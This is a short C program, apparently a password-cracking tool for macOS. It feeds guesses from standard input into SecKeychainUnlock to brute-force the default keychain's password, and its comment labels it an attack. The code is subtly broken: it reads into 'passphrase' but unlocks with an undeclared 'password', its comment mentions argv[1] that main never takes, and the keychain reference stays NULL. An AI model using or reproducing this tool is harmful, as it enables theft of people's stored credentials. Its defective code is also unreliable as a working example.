#include <Security/SecKeychain.h>

int main(void)
{
	OSStatus err;
	char passphrase[128];

	/* attack default keychain */
	SecKeychainRef keychain = NULL;

	/* argv[1] contains target keychain's name */
	while(fgets(passphrase, 128, stdin) != NULL) {
		err = SecKeychainUnlock(keychain,
				strlen(password), password, TRUE);
		if (!err) {
			printf ("Password Found : %s\n", password);
			exit(0);
		}
	}
}
